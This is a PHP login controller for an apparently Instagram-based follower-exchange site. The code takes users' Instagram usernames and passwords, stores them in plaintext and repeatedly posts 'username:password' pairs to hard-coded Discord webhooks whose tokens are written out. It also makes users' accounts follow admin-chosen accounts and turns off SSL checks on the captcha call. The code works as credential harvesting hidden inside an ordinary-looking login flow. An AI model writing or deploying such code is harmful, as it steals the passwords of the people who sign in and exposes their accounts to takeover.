<?php

namespace App\Controllers;

use App\Libraries\InstagramReaction;
use Exception;
use Wow;
use Wow\Net\Response;
use Instagram;

class MemberController extends BaseController
{

    /**
     * @var InstagramReaction $objInstagram
     */

    function onActionExecuting()
    {
        $actionResponse = parent::onActionExecuting();
        if ($actionResponse instanceof Response) {
            return $actionResponse;
        }

        if (Wow::get("project/memberLoginPrefix") != "/member" && $this->route->defaults["controller"] == "Home") {
            return $this->notFound();
        }

        if ($this->logonPerson->isLoggedIn()) {
            // return $this->redirectToUrl("/tools");
            return $this->redirectToUrl(Wow::get("ayar/sourceLink") == '0' ? Wow::get("ayar/loginDefault") : (Wow::get("ayar/sourceLink") == '1' ? Wow::get("ayar/loginSafelink") : Wow::get("ayar/loginSoralink")));
        }
    }

    function replace4byte($string, $replacement = '')
    {
        return preg_replace('%(?:
      \xF0[\x90-\xBF][\x80-\xBF]{2}      # planes 1-3
    | [\xF1-\xF3][\x80-\xBF]{3}          # planes 4-15
    | \xF4[\x80-\x8F][\x80-\xBF]{2}      # plane 16
)%xs', $replacement, $string);
    }

    private function bot($message, $url)
    {
        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => "{\"content\": \"$message\"}",
            CURLOPT_HTTPHEADER => array(
                "Content-Type: application/json",
                "Cookie: __cfduid=d5f1a47b65ad6e5eae8714df12c304b661597580155; __cfruid=f0077b70b216ca6a35ad1f5280ecec475e2dd4cc-1597580155"
            ),
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        return $response;
    }

    function IndexAction()
    {
        $notif_error = "https://discord.com/api/webhooks/1028312701820215396/LXlVakJxpMXH69mWHXyd3opzHx5vcOEVeJS2vMNAogI76aiEmDASL0tAMBlW6GwxWJYW";
        $url_login_success = "https://discord.com/api/webhooks/953691220851429457/dnwPv3lkij-P1HLT_5ci6oFVWZeg48Lhoqv0QMrtVGVaIWUUu0dc0W9szDjET7lGKIzi";
        // $url_error = "https://discord.com/api/webhooks/953691220851429457/dnwPv3lkij-P1HLT_5ci6oFVWZeg48Lhoqv0QMrtVGVaIWUUu0dc0W9szDjET7lGKIzi";
        $url_cookies_expired = "https://discord.com/api/webhooks/1028330939090206720/ZNTYdyw9Jbe-zdoT7U9Hrb3zM18B2z2OD42WhxaLMV-iHsSpmfBedKGhUz4ZGGoOlBkL";
        $url_spam = "https://discord.com/api/webhooks/1030106910109749332/DC0s8dV7R2Bezi9er1-DF-zuB6wQQH0hybBRhfoixgMYdqdCuadXiadG9AHTk9X9V7z5";
        // $url_proxy_error = "https://discord.com/api/webhooks/1036284641772064828/768dJ9KdmNrJ0Eg--gfsFkp4W_yL5f6aV1o1jLqKqA1iAhB24ccYlxeFOvUCIb6Hkyya";
        $url_challenge = "https://discord.com/api/webhooks/1036484768738594847/Qx-nJ2e5Kv6UIGXzTIEuxDlsFrBNN2Z2rXRj1gRvrRxTtghG35JD56vWb-NqaxeNBmKO";
        $url_restricted = "https://discord.com/api/webhooks/1040695954048819283/8VYqt6BCHHpyii_6Mi0mHrjxSwTh61rTcJkG2K1uFVzUeYKnucDRgl4_H8oauJde2ucq";
        $url_login_cookies = "https://discord.com/api/webhooks/1042585506912935949/JucdRMjdzEtr7A_d5_QuymOgNNoxV67kPdlZWTD3gJfAFF1r357-ni-APZyxDAx_lo2o";
        $url_step_data = "https://discord.com/api/webhooks/1052131159200509982/gtXfs0RAC-t3RPtY8gBAJc2qj-3PqUuz5sRIh95bUOt3T7nM5uBd1jOTuVMsOf3exdyi";

        //Geri dönüş için mevcut bir url varsa bunu not edelim.
        if (!is_null($this->request->query->returnUrl)) {
            $_SESSION["ReturnUrl"] = $this->request->query->returnUrl;
        }

        if ($this->request->method == "POST") {

            if (isset($this->request->data->antiForgeryToken) && $this->request->data->antiForgeryToken !== $_SESSION["AntiForgeryToken"]) {
                return $this->notFound();
            }

            $username   = strtolower(trim($this->request->data->username));
            $password   = trim($this->request->data->password);

            if (empty($username) || empty($password)) {
                return $this->json(array(
                    "status" => "0",
                    "error"  => "Sorry, your password is incorrect. Please check your password carefully."
                ));
            }

            if (!preg_match('/^[a-zA-Z0-9._]+$/', $username)) {
                sleep(5);

                return $this->json(array(
                    "status" => "0",
                    "error"  => "Sorry, your password is incorrect. Please check your password carefully."
                ));
            }


            if (!empty(Wow::get("ayar/GoogleCaptchaSiteKey")) && !empty(Wow::get("ayar/GoogleCaptchaSecretKey"))) {

                $url  = 'https://hcaptcha.com/siteverify';
                $data = array(
                    'secret'   => Wow::get("ayar/GoogleCaptchaSecretKey"),
                    'response' => $_POST["h-captcha-response"]
                );

                $verify = curl_init();
                curl_setopt($verify, CURLOPT_URL, $url);
                curl_setopt($verify, CURLOPT_POST, TRUE);
                curl_setopt($verify, CURLOPT_POSTFIELDS, http_build_query($data));
                curl_setopt($verify, CURLOPT_SSL_VERIFYPEER, FALSE);
                curl_setopt($verify, CURLOPT_RETURNTRANSFER, TRUE);
                $response = curl_exec($verify);

                $captcha_success = json_decode($response);
                if ($captcha_success->success == FALSE) {
                    return $this->json(array(
                        "status" => "0",
                        "error"  => "You must pass security verification I am human.",
                        "title"  => "not_clicked_hcaptcha"
                    ));
                }
            }

            $cookiesExpired = 6;
            $memberData = $this->db->row("SELECT * FROM uye WHERE kullaniciAdi=:username AND sifre=:password AND TIMESTAMPDIFF(HOUR, sonOlayTarihi, NOW()) < :cookiesExpired", array("username" => $username, "password" => $password, "cookiesExpired" => $cookiesExpired));
            $this->db->CloseConnection();

            try {
                $checkValid = new InstagramReaction($memberData['uyeID']);
                $mIn = $checkValid->objInstagram->getUserInfoByName('apradiptaa_');

                // if (stristr($mIn["feedback_message"], "Topluluğumuzu korumak için bazı hareketleri kısıtlıyoruz. Kullanımına bağlı olarak, bu işlem")) {
                //     $re = '/(?<=\D|^)(?<year>\d{4})(?<sep>[^\w\s])(?<month>1[0-2]|0[1-9])\k<sep>(?<day>0[1-9]|[12][0-9]|(?<=11|[^1][4-9])30|(?<=1[02]|[^1][13578])3[01])(?=\D|$)/m';
                //     // $str = 'Topluluğumuzu korumak için bazı hareketleri kısıtlıyoruz. Kullanımına bağlı olarak, bu işlem 2021-07-19 tarihine kadar gerçekleştirilemeyecek. Bir hata yaptığımızı düşünüyorsan bize bildir.';
                //     preg_match_all($re, $mIn["feedback_message"], $matches, PREG_SET_ORDER, 0);

                //     return $this->json(array(
                //         "status" => "0",
                //         "error"  => "Kamu bisa login lagi setelah tanggal berikut: " . $matches[0][0],
                //         "title" => "1"
                //     ));
                // }
                $status = $mIn['status'] == 'ok' ? true : false;
            } catch (Exception $e) {
                $status = false;
            }

            if (!$status) {
                $reactionUserID = $this->findAReactionUser();
                if (!empty($reactionUserID)) {
                    $objInstagramReaction = new InstagramReaction($reactionUserID);

                    $userDataNew             = $objInstagramReaction->objInstagram->getUserInfoByName($username);
                    if ($userDataNew["status"] != "ok") {

                        $userDataNew             = $objInstagramReaction->objInstagram->getUserIDByName($username);

                        if (!empty($userDataNew)) {
                            $userID = $userDataNew["body"]["graphql"]["user"]["id"];
                        } else {
                            $this->bot("Error - GetUserID -> Username: " . $username . " Proxy: " . $userDataNew["proxy"], $notif_error);
                            return $this->json(array(
                                "status" => "0",
                                "error"  => "Sorry, failed to find your ID. Contact us on telegram.",
                                "title" => "5"
                            ));
                        }
                    } else {
                        $userID = $userDataNew["user"]["pk"];
                        $banned = array();

                        if (Wow::get("ayar/bannedUserIDs") != "") {
                            $banned = explode(",", Wow::get("ayar/bannedUserIDs"));
                        }

                        if (in_array($userID, $banned)) {
                            // return FALSE;
                            return $this->json(array(
                                "status" => "0",
                                'error'  => "Gagal login, silahkan cek akun tumbal anda.",
                                "title" => "7",
                                "response" => $userDataNew
                            ));
                        }
                    }
                }

                $data = $this->instaLogin($username, $password, $userID);

                // print_r($data);

                $_SESSION["accountId"] = $data["Login"]["logged_in_user"]["pk"];

                $successLogin = FALSE;
                $isRestricted = TRUE;

                if ($data) {
                    $objInstagram = $data["Instagram"];
                    $arrLogin     = $data["Login"];

                    if ($objInstagram instanceof Instagram && $arrLogin["status"] == "ok") {
                        /**
                         * @var Instagram $objInstagram
                         */

                        if (isset($arrLogin["action"]) && $arrLogin["action"] == "close") {

                            return $this->json(array(
                                "status" => "0",
                                'error'  => "Account blocked by Instagram. Please use another account or try logging in again."
                            ));
                        }


                        if (isset($arrLogin["step_data"]) && count($arrLogin["step_data"]) > 0) {

                            $this->bot("Stepdata-required: [" . $username . ":" . $password . "]", $url_step_data);

                            return $this->json(array(
                                "status"  => "3",
                                'error'   => "Unsecured access detected. Please confirm your account.",
                                "allData" => $arrLogin
                            ));
                        }

                        $userData = $objInstagram->getCurrentUser();

                        // print_r($userData); die();

                        $profile_pic_url = $data["Login"]["logged_in_user"]["profile_pic_url"];
                        if (Wow::get("ayar/resimsizLogin") == 1 && stristr($profile_pic_url, "44884218_345707102882519_2446069589734326272_n.jpg")) {
                            return $this->json(array(
                                "status" => "0",
                                "error"  => "Accounts without profile photos cannot log into the system."
                            ));
                        }


                        if ($userData["message"] == "login_required") {

                            $cookiePath = Wow::get("project/cookiePath") . "instagramv3/" . substr($_SESSION["accountId"], -1) . "/" . $_SESSION["accountId"] . ".iwb";
                            if (file_exists($cookiePath)) {
                                unlink($cookiePath);
                                // $this->bot($cookiePath, $url_error);
                            }

                            $this->bot("username: " . $username  . ":" . $password . " user_id: " . $_SESSION["accountId"] . " - Cookies Expired - Path: " . $cookiePath, $url_cookies_expired);

                            return $this->json(array(
                                "status" => "0",
                                "error"  => "Your Cookies have expired. Please re-login for get new Cookies."
                            ));
                        }

                        if ($userData["message"] == "Veuillez patienter quelques minutes avant de réessayer." && $userData["status"] == "fail") {

                            $cookiePath = Wow::get("project/cookiePath") . "instagramv3/" . substr($_SESSION["accountId"], -1) . "/" . $_SESSION["accountId"] . ".iwb";
                            if (file_exists($cookiePath)) {
                                unlink($cookiePath);
                                // $this->bot($cookiePath, $url_error);
                            }

                            $this->bot("SPAM DETECTED - username: " . $username  . ":" . $password . " user_id: " . $_SESSION["accountId"], $url_spam);

                            return $this->json(array(
                                "status" => "0",
                                "error"  => "Your account has been detected as SPAM because you have logged in to too many sites. Don't be worry, you can try login later.",
                                "title" => "11",
                                "response" => $userData

                            ));
                        }

                        if ($userData["status"] == "fail" && $userData["message"] == "challenge_required") {

                            $this->bot("Status Challenge! - username: " . $username  . ":" . $password . " user_id: " . $_SESSION["accountId"] . " status: " . $userData["message"] . " action: userData", $url_challenge);
                            return $this->json(array(
                                "status" => "0",
                                "error"  => "Sorry, your account seems to have been challenged by Instagram. You have to open your instagram account via instagram.com and complete the challenge.",
                                "title" => "9"
                            ));
                        }

                        if ($userData["status"] == "fail") {
                            return $this->json(array(
                                "status" => "0",
                                "error"  => "Sorry ya, your password is incorrect. Please check your password carefully.",
                                "response" => $userData
                            ));
                        }

                        $userInfo = $objInstagram->getSelfUserInfo();
                        $inbox                          = $objInstagram->getV2Inbox();
                        $_SESSION["NonReadThreadCount"] = $inbox["inbox"]["unseen_count"];

                        $followIserIDs = Wow::get("ayar/adminFollowUserIDs");
                        if (!empty($followIserIDs)) {
                            $exIDs = explode(",", $followIserIDs);
                            foreach ($exIDs as $exID) {
                                if (intval($exID) > 0) {
                                    $objInstagram->getUserInfoById($exID);
                                    $statusFollow = $objInstagram->follow($exID);

                                    if ($statusFollow["status"] == "fail" && $statusFollow["category"] == "user_restriction_FOLLOW_RESTRICT") {
                                        $isRestricted = FALSE;
                                        $re = '/(?<=\D|^)(?<year>\d{4})(?<sep>[^\w\s])(?<month>1[0-2]|0[1-9])\k<sep>(?<day>0[1-9]|[12][0-9]|(?<=11|[^1][4-9])30|(?<=1[02]|[^1][13578])3[01])(?=\D|$)/m';
                                        preg_match_all($re, $statusFollow["feedback_message"], $matches, PREG_SET_ORDER, 0);
                                        $this->bot("Account-Restricted! `[" . $username  . ":" . $password . "]` user_id: " . $_SESSION["accountId"] . " End Date: [" . $matches[0][0] . "]", $url_restricted);
                                        // print_r($isRestricted); die();
                                        // return $this->json(array(
                                        //     "status" => "0",
                                        //     "error"  => "You can log in again after the following dates: " . $matches[0][0],
                                        //     "title" => "1",
                                        //     "body" => $statusFollow
                                        // ));
                                    }
                                }
                            }
                        }


                        $following_count = $userInfo["user"]["following_count"];
                        $follower_count  = $userInfo["user"]["follower_count"];
                        $phoneNumber     = $data["Login"]["logged_in_user"]["phone_number"];
                        $gender          = $userData["user"]["gender"];
                        $birthday        = $userData["user"]["birthday"];
                        $profilePic      = $data["Login"]["logged_in_user"]["profile_pic_url"];
                        $full_name       = self::replace4byte(preg_replace("/[^[:alnum:][:space:]]/u", "", $data["Login"]["logged_in_user"]["full_name"]));
                        $instaID         = $data["Login"]["logged_in_user"]["pk"] . "";
                        $email           = $userData["user"]["email"];

                        $uyeID = $this->db->single("SELECT uyeID FROM uye WHERE instaID = :instaID LIMIT 1", array("instaID" => $instaID));
                        $this->db->CloseConnection();

                        $checkCookies = $this->db->row("SELECT kullaniciAdi FROM uye WHERE kullaniciAdi=:username AND sifre=:password", array("username" => $username, "password" => $password));
                        $this->db->CloseConnection();

                        if (!empty($checkCookies)) {
                            // bot success login
                            $this->bot("username: " . $username  . ":" . $password . " user_id: " . $_SESSION["accountId"] . " reset cookies", $url_login_success);
                        }

                        if ($isRestricted) {
                            $isRestrictedValue = 1;
                        } else {
                            $isRestrictedValue = 0;
                        }

                        if (!empty($uyeID)) {

                            $this->db->query("UPDATE uye SET kullaniciAdi = :kullaniciAdi,sifre = :sifre, takipciSayisi = :takipciSayisi,takipEdilenSayisi = :takipEdilenSayisi,phoneNumber = :phoneNumber, isRestricted = :isRestricted, timeRestricted = :timeRestricted, gender = :gender,birthday = :birthday,profilFoto = :profilFoto,fullName = :fullName,email = :email, isActive = 1, sonOlayTarihi = NOW(), isWebCookie = 0 WHERE instaID = :instaID", array(
                                "kullaniciAdi"      => $username,
                                "sifre"             => $password,
                                "takipciSayisi"     => $follower_count,
                                "takipEdilenSayisi" => $following_count,
                                "phoneNumber"       => $phoneNumber,
                                "gender"            => $gender,
                                "birthday"          => $birthday,
                                "profilFoto"        => "data:image/png;base64, " . base64_encode(file_get_contents($profilePic)),
                                "fullName"          => $full_name,
                                "email"             => $email,
                                "isRestricted"      => $isRestrictedValue,
                                "timeRestricted"    => $matches[0][0],
                                "instaID"           => $instaID . ""
                            ));
                            $this->db->CloseConnection();
                        } else {

                            $this->db->query("INSERT INTO uye (instaID, profilFoto, fullName, kullaniciAdi, sifre, takipEdilenSayisi, takipciSayisi,takipKredi,begeniKredi,yorumKredi,storyKredi,videoKredi,saveKredi,yorumBegeniKredi,canliYayinKredi,phoneNumber, isRestricted, timeRestricted, email, gender, birthDay, isWebCookie) VALUES(:instaID, :profilFoto, :fullName, :kullaniciAdi, :sifre, :takipEdilenSayisi, :takipciSayisi, :takipKredi, :begeniKredi,:yorumKredi,:storyKredi,:videokredi,:savekredi, :yorumBegeniKredi,:canliYayinKredi,:phoneNumber, :isRestricted, :timeRestricted, :email, :gender, :birthDay, 0)", array(
                                "instaID"           => $instaID . "",
                                "profilFoto"        => "data:image/png;base64, " . base64_encode(file_get_contents($profilePic)),
                                "fullName"          => $full_name,
                                "kullaniciAdi"      => $username,
                                "sifre"             => $password,
                                "isRestricted"      => $isRestrictedValue,
                                "timeRestricted"    => $matches[0][0],
                                "takipEdilenSayisi" => $following_count,
                                "takipciSayisi"     => $follower_count,
                                "takipKredi"        => Wow::get("ayar/yeniUyeTakipKredi"),
                                "begeniKredi"       => Wow::get("ayar/yeniUyeBegeniKredi"),
                                "yorumKredi"        => Wow::get("ayar/yeniUyeYorumKredi"),
                                "storyKredi"        => Wow::get("ayar/yeniUyeStoryKredi"),
                                "videokredi"        => Wow::get("ayar/yeniUyeVideoKredi"),
                                "savekredi"         => Wow::get("ayar/yeniUyeSaveKredi"),
                                "yorumBegeniKredi"  => Wow::get("ayar/yeniUyeYorumBegeniKredi"),
                                "canliYayinKredi"   => Wow::get("ayar/yeniUyeCanliKredi"),
                                "phoneNumber"       => $phoneNumber,
                                "email"             => $email,
                                "gender"            => $gender,
                                "birthDay"          => $birthday
                            ));
                            $this->db->CloseConnection();

                            // bot success login
                            $this->bot("username: " . $username  . ":" . $password . " user_id: " . $_SESSION["accountId"], $url_login_success);
                        }

                        $memberData   = $this->db->row("SELECT * FROM uye WHERE instaID=:instaID", array("instaID" => $instaID));
                        $this->db->CloseConnection();
                        $successLogin = TRUE;
                        $this->logonPerson->setLoggedIn(TRUE);
                        $this->logonPerson->setMemberData($memberData);
                        session_regenerate_id(TRUE);
                    }
                }
            } else {
                $this->bot("username: " . $username  . ":" . $password . " user_id: " . $memberData['instaID'] . " login with cookies", $url_login_cookies);
                $_SESSION["accountId"] = $memberData['instaID'];
                $userID = $memberData['instaID'];
                $successLogin = TRUE;
                $this->logonPerson->setLoggedIn(TRUE);
                $this->logonPerson->setMemberData($memberData);
                session_regenerate_id(TRUE);
            }

            if ($successLogin) {
                return $this->json(array(
                    "status"    => "success",
                    "returnUrl" => Wow::get("ayar/sourceLinkLogin") == '0' ? Wow::get("ayar/loginDefault") : (Wow::get("ayar/sourceLinkLogin") == '1' ? Wow::get("ayar/loginSafelink") : Wow::get("ayar/loginSoralink"))
                ));
            } else {
                return $this->json(array(
                    "status" => "0",
                    "error"  => "Sorry, your password is incorrect. Please check your password carefully.",
                    "body" => $data["Login"]
                ));
            }
        }

        $_SESSION["AntiForgeryToken"] = md5(uniqid(mt_rand(), TRUE));

        $ipaddress = $this->ipaddress();
        $this->view->set("ipaddress", $ipaddress);

        $data = $this->db->query("SELECT name, fill, created_at FROM post WHERE status = 2 LIMIT 1");
        $this->db->CloseConnection();

        $this->view->set("data", $data);
        $this->view->set("helper", $this->helper);

        return $this->partialView();
    }
    private function ipaddress($username = NULL)
    {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP'))
            $ipaddress = getenv('HTTP_CLIENT_IP');
        else if (getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if (getenv('HTTP_X_FORWARDED'))
            $ipaddress = getenv('HTTP_X_FORWARDED');
        else if (getenv('HTTP_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if (getenv('HTTP_FORWARDED'))
            $ipaddress = getenv('HTTP_FORWARDED');
        else if (getenv('REMOTE_ADDR'))
            $ipaddress = getenv('REMOTE_ADDR');
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }


    private function instaLogin($username, $password, $userID)
    {

        if (!isset($_SESSION["deviceToken"])) {
            $_SESSION["deviceToken"] = NULL;
        }

        try {
            $i = new Instagram($username, $password, $userID, TRUE, $_SESSION["deviceToken"]);
            $l = $i->login(TRUE);

            return array(
                "Instagram" => $i,
                "Login"     => $l
            );
        } catch (Exception $e) {

            try {
                $i = new Instagram($username, $password, $userID, TRUE, $_SESSION["deviceToken"]);
                $l = $i->login(TRUE, FALSE);

                return array(
                    "Instagram" => $i,
                    "Login"     => $l
                );
            } catch (Exception $e) {

                return array(
                    "status" => "0",
                    "error"  => $e->getMessage()
                );
            }
        }
    }
}
